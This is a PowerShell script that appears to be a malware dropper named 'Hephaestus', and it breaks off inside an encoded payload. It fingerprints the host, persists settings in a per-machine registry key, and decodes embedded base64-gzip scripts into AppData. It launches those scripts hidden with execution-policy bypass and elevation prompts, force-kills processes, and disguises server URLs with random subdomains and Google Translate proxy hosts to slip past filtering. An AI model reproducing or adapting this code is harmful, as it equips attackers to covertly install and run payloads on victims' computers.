function IsDebug {
    $debugFile = "C:\debug.txt"
    
    try {
        # Check if the file exists
        if (Test-Path $debugFile -PathType Leaf) {
            return $true
        } else {
            return $false
        }
    } catch {
        # Catch any errors that occur during the Test-Path operation
        return $false
    }
}

$machineCode = ""

function Get-MachineCode {

    if ([string]::IsNullOrEmpty($machineCode) -eq $false)
    {
        return $machineCode
    }
    try {
        $biosSerial = (Get-WmiObject Win32_BIOS).SerialNumber
        $mbSerial = (Get-WmiObject Win32_BaseBoard).SerialNumber
        $macAddress = (Get-WmiObject Win32_NetworkAdapterConfiguration | Where-Object { $_.MACAddress -and $_.IPEnabled }).MACAddress[0]
    
        $combinedString = "$biosSerial$mbSerial$macAddress"
    
        $sha256 = [System.Security.Cryptography.SHA256]::Create()
        $bytes = [System.Text.Encoding]::UTF8.GetBytes($combinedString)
        $hashBytes = $sha256.ComputeHash($bytes)
    
        # Convert to Base64 and take the first 12 characters
        $hashString = [Convert]::ToBase64String($hashBytes) -replace "[^a-zA-Z0-9]", ""  # Remove non-alphanumeric characters
        
        $machineCode = $hashString.Substring(0, 12)
    }
    catch 
    {
        $machineCode = "Hephaestus"
    }
    return $machineCode
}

$hepaestusReg = "HKCU:\Software\$($(Get-MachineCode))"

$globalDebug = IsDebug;

function CustomDecode {
    param (
        [string]$inContent,
        [string]$outFile
    )
    try {
        $decodedBytes = [Convert]::FromBase64String($inContent)

        $memoryStream = New-Object System.IO.MemoryStream(,$decodedBytes)
        $gzipStream = New-Object System.IO.Compression.GZipStream($memoryStream, [System.IO.Compression.CompressionMode]::Decompress)
        $outputStream = New-Object System.IO.MemoryStream

        $gzipStream.CopyTo($outputStream)
        $gzipStream.Close()
        $memoryStream.Close()

        [System.IO.File]::WriteAllBytes($outFile, $outputStream.ToArray())
    }
    catch {
        writedbg "Failed to decode to file $outFile and decompress: $_"
    }
}

function Get-SHA256HashBase64 {
    param ([string]$inputString)
    $sha256 = [System.Security.Cryptography.SHA256]::Create()
    $byteArray = [System.Text.Encoding]::UTF8.GetBytes($inputString)
    $hashBytes = $sha256.ComputeHash($byteArray)
    return [Convert]::ToBase64String($hashBytes)
}

function CustomDecodeEnveloped {
    param (
        [string]$inContent,
        [string]$outFile
    )
    $parsed = $inContent | ConvertFrom-Json
    $evalHash = Get-SHA256HashBase64($parsed.json)
    if ($evalHash -ne $parsed.hash)
    {
        throw "Wrong Hash";
    }
    return CustomDecode -inContent $parsed.json -outFile $outFile
}

function EnvelopeIt {
    param ([string]$inputString)
    
    $hash = Get-SHA256HashBase64 -inputString $inputString
    
    $envelope = @{
        json = $inputString
        hash = $hash
    }
    
    return ($envelope | ConvertTo-Json)
}

function ModifyUrl {
    param ([string]$url)
    
    $uri = [System.Uri]$url
    $domainParts = $uri.Host.Split('.')
    

    if ($domainParts.Length -eq 3 -and $domainParts[0] -eq "localhost") {
    }
    else
    {
        $domainParts = @(Get-RandomString) + $domainParts
    }
    $newHost = ($domainParts -join '.')
    
    $newQuery = $uri.Query
    $randomArg = "xxx=" + (Get-RandomString)
    
    if ($newQuery) {
        if ($newQuery.StartsWith('?')) {
            $newQuery = "?" + $randomArg + "&" + $newQuery.Substring(1)
        }
    } else {
        $newQuery = "?" + $randomArg
    }
    
    if ($uri.Port -ne 80 -and $uri.Port -ne 443) {
        $newUrl = $uri.Scheme + "://" + $newHost + ":" + $uri.Port + $uri.AbsolutePath + $newQuery
    } else {
        $newUrl = $uri.Scheme + "://" + $newHost + $uri.AbsolutePath + $newQuery
    }
    
    return $newUrl
}

function GoogleUrl{
    param ([string]$url)
    
    $uri = [System.Uri]$url
    $domainParts = $uri.Host.Split('.')
    
    if ($domainParts.Length -gt 2) {
        $newHost = $domainParts[0] + '-' + $domainParts[1] + '-' + $domainParts[2]
    } else {
        $newHost = $domainParts[0] + '-' + $domainParts[1]
    }

    $newUrl = "https://" + $newHost + ".translate.goog" + $uri.AbsolutePath + "?_x_tr_sch=http&_x_tr_sl=en&_x_tr_tl=ja&_x_tr_hl=ru&_x_tr_pto=wapp"
    
    return $newUrl
}


function Get-RandomString {
    $length = 8
    $characters = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
    $randomString = -join ((0..($length-1)) | ForEach-Object { $characters[(Get-Random -Minimum 0 -Maximum $characters.Length)] })
    return $randomString
}


function SmartServerlUrl{
    param ([string]$url)
         $url = ModifyUrl -url $url
         return $url
}


function writedbg {
    param (
        [string]$msg,   [string]$msg2=""
    )
        if ($globalDebug){
            Write-Host $msg + $msg2
        }
}

function Get-HephaestusFolder {
    $appDataPath = [System.Environment]::GetFolderPath('ApplicationData')
    $hephaestusFolder = Join-Path $appDataPath $($(Get-MachineCode))
    return $hephaestusFolder
}

function Get-HolderPath {
    $hephaestusFolder = Get-HephaestusFolder
    $scriptName = (Get-MachineCode) + '.' + 'ps1'
    $holderPath = Join-Path $hephaestusFolder -ChildPath $scriptName
    return $holderPath
}

function Get-BodyPath {
    $hephaestusFolder = Get-HephaestusFolder
    $scriptName = (Get-MachineCode) + '_b.' + 'ps1'
    $bodyPath = Join-Path $hephaestusFolder -ChildPath $scriptName
    return $bodyPath
}

function Test-Arg{ param ([string]$arg)
    $globalArgs = $global:args -join ' '
    if ($globalArgs -like "*$arg*") {
        return $true
    }
    return $false
} 


function Test-Autostart 
{
    return Test-Arg -arg "autostart"
}


function GetArg {
    param ([string]$arg)

    $globalArgs = $global:args
    $arg = $arg.ToLower()

    for ($i = 0; $i -lt $globalArgs.Count; $i++) {
        $currentArg = $globalArgs[$i].TrimStart("-").ToLower()
        if ( (ArgsEqual $currentArg $arg) -and $i + 1 -lt $globalArgs.Count) {
            return $globalArgs[$i + 1]
        }
    }

    return ""
}

function StrToInt {
    param ([string]$value)

    if ([string]::IsNullOrWhiteSpace($value)) {
        return 0
    }

    $intValue = 0
    if ([int]::TryParse($value, [ref]$intValue)) {
        return $intValue
    }

    return 0
}

function StrToBool {
    param ([string]$value, [bool]$default)

    if ([string]::IsNullOrWhiteSpace($value)) {
        return $default
    }

    $boolValue = $default
    if ([bool]::TryParse($value.ToLower(), [ref]$boolValue)) {
        return $boolValue
    }

    return $default
}

function RegWrite {
    param (
        [string]$registryPath,
        [string]$keyName,
        [string]$value
    )

    try {
        if (Test-Path -Path $registryPath) {
            $currentValue = Get-ItemProperty -Path $registryPath -Name $keyName -ErrorAction SilentlyContinue

            if ($currentValue.$keyName -eq $value) {
                writedbg "The '$keyName' key is already set with the correct value." -ForegroundColor Green
            } else {
                Set-ItemProperty -Path $registryPath -Name $keyName -Value $value
                writedbg "'$keyName' key updated with the correct value." -ForegroundColor Green
            }
        } else {
            New-Item -Path $registryPath -Force | Out-Null
            New-ItemProperty -Path $registryPath -Name $keyName -Value "$value" -PropertyType String -Force | Out-Null
            writedbg "'$keyName' key added to startup." -ForegroundColor Green
        }
    } catch {
        writedbg "Error while adding/updating the '$keyName' key: $($_.Exception.Message)" -ForegroundColor Red
    }
}

function RegWriteInt {
    param (
        [string]$registryPath,
        [string]$keyName,
        [int]$value
    )

    RegWrite -registryPath $registryPath -keyName $keyName -value $value.ToString()
}

function RegRead {
    param (
        [string]$registryPath,
        [string]$keyName
    )

    try {
        if (Test-Path -Path $registryPath) {
            $currentValue = Get-ItemProperty -Path $registryPath -Name $keyName -ErrorAction SilentlyContinue
            $res = $currentValue.$keyName
            if ($null -eq $res)
            {
                $res = "";
            }
            return $res
        }
    } catch {
        writedbg "Error reading registry key '$keyName' from '$registryPath': $($_.Exception.Message)" -ForegroundColor Red
    }

    return ""
}

function RegReadInt {
    param (
        [string]$registryPath,
        [string]$keyName
    )

    $value = RegRead -registryPath $registryPath -keyName $keyName
    return StrToInt -value $value
}

function RegReadBool {
    param (
        [string]$registryPath,
        [string]$keyName,
        [bool]$default
    )

    $value = RegRead -registryPath $registryPath -keyName $keyName
    return StrToBool -value $value -default $default
}

function RegWriteParam {
    param (
        [string]$keyName,
        [string]$value
    )
    $registryPath = $hepaestusReg
    RegWrite -registryPath $registryPath -keyName $keyName -value $value
}

function RegWriteParamInt {
    param (
        [string]$registryPath,
        [string]$keyName,
        [int]$value
    )
    RegWriteParam -keyName $keyName -value $value.ToString()
}

function RegWriteParamBool {
    param (
        [string]$registryPath,
        [string]$keyName,
        [bool]$value
    )
    RegWriteParam -keyName $keyName -value $value.ToString().ToLower()
}

function RegReadParam {
    param (
        [string]$keyName
    )
    $registryPath = $hepaestusReg
    return RegRead -registryPath $registryPath -keyName $keyName
}

function RegReadParamInt {
    param (
        [string]$keyName
    )
    $registryPath = $hepaestusReg
    return RegReadInt -registryPath $registryPath -keyName $keyName
}

function RegReadParamBool {
    param (
        [string]$keyName,        [bool]$default
    )
    $registryPath = $hepaestusReg
    return RegReadBool -registryPath $registryPath -keyName $keyName -default $default
}

function GetArgInt {
    param ([string]$arg)

    return StrToInt (GetArg $arg)
}

function EnsureDashPrefix {
    param ([string]$value)

    if (-not $value.StartsWith("-")) {
        return "-" + $value
    }
    return $value
}

function ArgsEqual {
    param (
        [string]$arg1,
        [string]$arg2
    )

    # Normalize both arguments (remove leading "-" and compare case-insensitively)
    $normalizedArg1 = $arg1.TrimStart("-").ToLower()
    $normalizedArg2 = $arg2.TrimStart("-").ToLower()

    return $normalizedArg1 -eq $normalizedArg2
}

function RunMe {
    param (
        [string]$script, 
        [bool] $repassArgs,
        [string]$argName,
        [string]$argValue,
        [bool]$uac
    )

    $argName = EnsureDashPrefix -value $argName

    $scriptPath = $script
    
    $local = @("-ExecutionPolicy", "Bypass", "-File", """$scriptPath""")
    
    if ($repassArgs -eq $true) {
        $globalArgs = $global:args
        $filteredArgs = @()
        $skipNext = $false

        for ($i = 0; $i -lt $globalArgs.Count; $i++) {
            if ($skipNext) 
            {
                $skipNext = $false
                continue
            }

            if (ArgsEqual $globalArgs[$i] $argName) {
                $skipNext = $true
                continue
            }

            $filteredArgs += $globalArgs[$i]
        }
        $globalArgs = $filteredArgs
        $local += $globalArgs
        if (-not [string]::IsNullOrEmpty($argName) -and $argName -ne "-") {
            $local += $argName
            $local += $argValue
        }
    }

    $argumentList = ""
    for ($i = 0; $i -lt $local.Count; $i += 1) {
        $arg = $local[$i]
        $argumentList += "$arg "
    }

    writedbg "starting  $argumentList"

    if ($globalDebug)
    {
        if ($uac -eq $true) {
            Start-Process powershell.exe -Verb RunAs -WindowStyle Normal -ArgumentList $argumentList
        } else {
            Start-Process powershell.exe -WindowStyle Normal -ArgumentList $argumentList
        }
    }
    else 
    {
        if ($uac -eq $true) {
            Start-Process powershell.exe -Verb RunAs -WindowStyle Hidden -ArgumentList $argumentList
        } else {
            Start-Process powershell.exe -WindowStyle Hidden -ArgumentList $argumentList
        }
    }

}

function IsElevatedOld
{
    if (-NOT ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator))
    {
        return $false
    }
    return $true
}

function IsElevated {
    $winID = [Security.Principal.WindowsIdentity]::GetCurrent()
    $princ = New-Object Security.Principal.WindowsPrincipal($winID)
    return $princ.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator) -and $winID.Owner -ne $winID.User
}

function Get-EnvPaths {
    $a = Get-LocalAppDataPath
    $b =  Get-AppDataPath
    return @($a , $b)
}

function Get-TempFile {
    $tempPath = [System.IO.Path]::GetTempPath()
    $tempFile = [System.IO.Path]::GetTempFileName()
    return $tempFile
}

function Get-LocalAppDataPath {
    return [System.Environment]::GetFolderPath([System.Environment+SpecialFolder]::LocalApplicationData)
}

function Get-AppDataPath {
    return [System.Environment]::GetFolderPath([System.Environment+SpecialFolder]::ApplicationData)
}

function Get-ProfilePath {
    return [System.Environment]::GetFolderPath([System.Environment+SpecialFolder]::UserProfile)
}

function Close-Processes {
    param (
        [string[]]$processes
    )

    foreach ($process in $Processes) {
        $command = "taskkill.exe /im $process /f"
        Invoke-Expression $command
    }
}



###head


###head


function GetLocalScriptPath {
    param
    (

    [Parameter(Mandatory = $true)]
    [string[]]
    $taskName
    )
    $scriptPath = Get-HephaestusFolder
    $fullPath = Join-Path -Path $scriptPath -ChildPath "$taskName.ps1"
    return $fullPath
}

function Save-Script
{
    param
    (
        [Parameter(Mandatory = $true)]
        [string[]]
        $taskName,

        [Parameter(Mandatory = $true)]
        [string[]]
        $body
    )
    $scriptPath= GetLocalScriptPath -taskName $taskName
    CustomDecode -inContent $body -outFile $scriptPath
    return $fullPath
}

function Invoke-Script
{
    param
    (
        [Parameter(Mandatory = $true)]
        [string[]]
        $taskName
    )
    $scriptPath= GetLocalScriptPath -taskName $taskName
    if ($globalDebug)
    {
        Start-Process powershell.exe -WindowStyle Normal -ArgumentList "-ExecutionPolicy Bypass -file ""$scriptPath"" -Task $taskName"
    }
    else
    {
        Start-Process powershell.exe -WindowStyle Hidden -Verb RunAs -ArgumentList "-ExecutionPolicy Bypass -File `"$scriptPath`" -Task $taskName"
    }
}

$global:Task = $null

for ($i = 0; $i -lt $args.Count; $i++) {
    if ($args[$i] -eq '-Task') {
        if ($i + 1 -lt $args.Count) {
            $global:Task = $args[$i + 1]
        } else {
            writedbg "No value provided for -Task argument."
        }
    }
}

function Main 
{
    $showPath = GetLocalScriptPath -taskName "program"
    writedbg "program curScript: $showPath"

    if ($global:Task) {
        writedbg "Task - $task"
        & $global:Task
    } else 
    {               

   
        $tasks = @{
               "startdownloads" = "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"
    "dnsman" = "H4sIAAAAAAAACtU7a3PbtrLfM5P/gGE1R1IdMpbzuKk6mlaRncQ98eNYdnxvXd8MRK4kxiTBgqBtNc1/v7MASAIkZTmvzlxlJpbw2PcuFgvgnIcC3DcsE6QbJFlMk+7DB/M88UXIErKf7cIsX5CPDx8QQkgnwF+vwgjIiDiT4R/ytyduhaMGqP8FXxUz8PMDmSzBvyLhnIglkDlOh9swE1k1JpyT3ilkwj2mYmnikQ2nqxTIW6DzvgkXPxxEzhPSETyHqucTgSiDdWPnNMrMwerrJ+JT4S9rhMsmmqwIcM54RsSSCsJ8P+ckyHmYLCRLFeUsBU5RdBWUFrSfHj749PDBwwedmPrLMIEJC6REHWwshf8ahHtgDPiIvYWwLjKB6C+Hw/3sMI+iI74Xp2LVM0H2iQt/asR9NfVjky5jQkldixY7s5BlU+AhjciI9JC48zg8mn0AX5DzMHmy8/7l/tG076kxh3k8A25Mj2cbJtMMXjLKg/UQqD8OAg5Ztg7GIYgbxq/GAU0F8AlL5uEiV/ogf5PzJXBw9YSPpPPeOxhPCoguTQJs2j/eS+gsgoB86hv9F9uXpoVLenwWz8IEgqnUBOrPkFHJr0G20wCRLenOs+dkRC6mq0xA7E3Bz3koVt6Er1LBFpymy5U3fTPeefb8cjiccKACen1TLSsBmQHhFG6Ft5f4LFDmcXb66oX3GsRLHNerEW0CWtJsKQeRUUGYN2Fxmgt4Q7NlT2HSMywnYck1cEEEI6jE508JylLQK9D+zjNBBjvEX1JOfQE8q2EtBXihQV0Oh6dMwVJ9vYq6PnE5pBH1gTgX/0vdv8bu79vuT5fOI+I4SM4JxOwaSMISl0bpkiZ5DDz0W9Hb1mW4okGXN81nytl624/IYKdveYkKGg3nqnv2G0iXFDKRF0agp7c6oYoNS0jVjBOQxvXm35Oz4R9TNhc3lMMfnV6nV4sQ/b4MIJ1FxGY0UpF7VMTwn63YMskzw